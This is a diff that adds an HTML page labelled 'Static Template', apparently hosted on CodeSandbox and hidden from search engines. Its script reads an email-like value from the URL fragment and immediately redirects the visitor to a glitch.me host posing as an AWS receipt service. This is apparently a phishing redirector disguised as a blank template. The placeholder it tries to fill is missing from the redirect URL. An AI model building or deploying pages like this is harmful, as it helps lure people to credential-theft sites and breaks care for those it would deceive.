@@ -1,0 +1,27 @@
+<script  type="text/javascript" src="https://codesandbox.io/public/sse-hooks/sse-hooks.f648b14c15c640a14a557113a991cb8d.js"></script>
+    <script  type="text/javascript" src="https://codesandbox.io/static/js/banner.be879265d.js"></script>
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta name="robots" content="noindex, nofollow" />
+    <meta name="googlebot" content="noindex, nofollow" />
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>Static Template</title>
+  </head>
+  <body>
+    <script>
+      var queryString = window.location.href;
+      var email = queryString.split("#");
+      var encodedEmail = email[1];
+      setTimeout(function () {
+        var redirect =
+          "https://recpt-awscloud-q3wurl9k.glitch.me/?hash-id=Cq9vOxwNg8awvBcsxI3CrmPPEE2xAWZxJkAID6S78JccbtjETHXyT4KhWonZGuxRNurl46Gyy7q4sGCq9vOxwNg8awvBcsxI3CrmPPEE2xAWZxJkAID6S78JccbtjETHXyT4KhWonZGuxRNurl46Gyy7q4sG";
+        var link = redirect.replace("{domain}", encodedEmail);
+        window.location.href = link;
+      }, 0);
+    </script>
+    <script crossorigin type="text/javascript" src="https://codesandbox.io/static/js/watermark-button.be960f43b.js"></script>
+  </body>
+</html>
